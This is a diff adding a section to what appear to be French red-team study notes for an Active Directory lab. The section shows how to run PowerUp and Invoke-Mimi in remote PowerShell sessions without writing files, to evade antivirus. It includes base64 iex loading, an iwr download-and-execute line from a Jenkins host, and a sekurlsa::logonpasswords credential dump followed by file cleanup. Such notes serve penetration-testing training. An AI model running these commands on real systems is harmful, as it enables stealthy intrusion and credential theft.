@@ -14,6 +14,67 @@ Enter-PSSession -ComputerName <TARGET> -Credential <DOMAIN>\<USER>
 winrs -r:<TARGET> cmd
 ```
 
+### Lancer un .ps1 local sur box distante SANS drop de fichier (PATTERN CLÉ)
+
+> [!important] `Invoke-Command -FilePath` = script chargé **en mémoire dans le WSMprovhost.exe distant**, jamais écrit sur disque cible → **aucune détection AV file-based**, aucun cleanup à faire.
+> Le prérequis c'est **admin sur la cible** (droit de créer une PSSession), pas admin dessus = `Access denied` avant même le -FilePath.
+
+```powershell
+# 1. PSSession persistante (obligatoire pour enchaîner les commandes)
+$s = New-PSSession -ComputerName <target>
+
+# 2. Charge le .ps1 LOCAL dans la runspace DISTANTE (contenu textuel envoyé, pas de fichier)
+Invoke-Command -Session $s -FilePath C:\AD\Tools\PowerUp.ps1
+
+# 3. Toutes les fonctions du .ps1 sont maintenant dispos dans $s
+Invoke-Command -Session $s -ScriptBlock { Invoke-AllChecks }
+Invoke-Command -Session $s -ScriptBlock { Invoke-ServiceAbuse -Name '<svc>' -UserName 'dcorp\student426' }
+
+# 4. Cleanup session (le contenu du .ps1 disparaît avec)
+Remove-PSSession $s
+```
+
+> [!warning] Piège critique — persistance des fonctions
+> Chaque `Invoke-Command` **SANS** `-Session` crée un runspace **jetable** → les fonctions chargées disparaissent immédiatement. Symptôme : `Invoke-Command -ComputerName X -FilePath tool.ps1` marche, puis `Invoke-Command -ComputerName X -ScriptBlock { Invoke-AllChecks }` renvoie `not recognized`.
+> **Fix** : TOUJOURS passer par `New-PSSession` → `-Session $s` sur toutes les étapes → `Remove-PSSession $s` à la fin.
+
+**Variantes équivalentes selon contexte** :
+
+```powershell
+# A. one-shot base64 (utile en Jenkins build step ou pipeline sans persistance)
+$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content C:\AD\Tools\PowerUp.ps1 -Raw)))
+Invoke-Command -ComputerName <target> -ScriptBlock {
+  param($b64)
+  iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64)))
+  Invoke-AllChecks
+} -ArgumentList $b64
+
+# B. héberger sur Jenkins userContent (cf LO07 exfil, mais dans l'autre sens) — utile si tu veux qu'une box distante récupère le .ps1 elle-même
+Invoke-Command -ComputerName <target> -ScriptBlock {
+  iex (iwr http://dcorp-ci:8080/userContent/PowerUp.ps1 -UseBasicParsing)
+  Invoke-AllChecks
+}
+
+# C. drop temporaire (si tu as besoin d'un .exe et pas seulement d'un .ps1)
+Copy-Item -ToSession $s -Path C:\AD\Tools\Invoke-Mimi.ps1 -Destination C:\Users\Public\
+Invoke-Command -Session $s -ScriptBlock {
+  . C:\Users\Public\Invoke-Mimi.ps1
+  Invoke-Mimi -Command '"privilege::debug" "sekurlsa::logonpasswords"'
+  Remove-Item C:\Users\Public\Invoke-Mimi.ps1 -Force
+}
+```
+
+**Quand utiliser quoi :**
+| Situation | Méthode |
+|-----------|---------|
+| Enchaîner plusieurs cmdlets d'un même tool (PowerUp, PowerView, Invoke-Mimi) | **`-Session $s` + `-FilePath` (A)** |
+| One-shot dans un Jenkins build (pas de PSSession dispo) | **base64 (variante A)** |
+| Box distante doit se servir elle-même (out-of-band) | **iwr userContent (variante B)** |
+| `.exe` obligatoire (Rubeus, SharpHound, SafetyKatz) | **Copy-Item -ToSession + drop temp (variante C)**, ou reflectively load en mémoire (`[Reflection.Assembly]::Load([IO.File]::ReadAllBytes(...))` — cf [[LO07 - Session DA et escalade]] étape 8) |
+
+> [!tip] Piège double-hop (Kerberos)
+> `-FilePath` marche parce que Kerberos délègue tes creds au 1er hop (WinRM). MAIS si le .ps1 distant essaie à son tour d'accéder à une autre box (`Invoke-Command depuis la PSSession`, `\\autre-serveur\share`) → **`Access denied`** (double-hop bloqué). Workaround : OverPass-the-Hash dans la PSSession, `-Credential` explicite, ou activer CredSSP.
+
 ### Après `Find-PSRemotingLocalAdminAccess`
 
 Il liste les hôtes où **ton identité courante** est admin via PSRemoting. `Enter-PSSession -ComputerName <TARGET>` → tu es sur la box : tape les commandes **direct** (`whoami /all`, `klist`, dump), puis re-hunt → saut suivant (vers DA). Compte **dumpé** ≠ user courant → OverPass-the-Hash d'abord (ci-dessous).
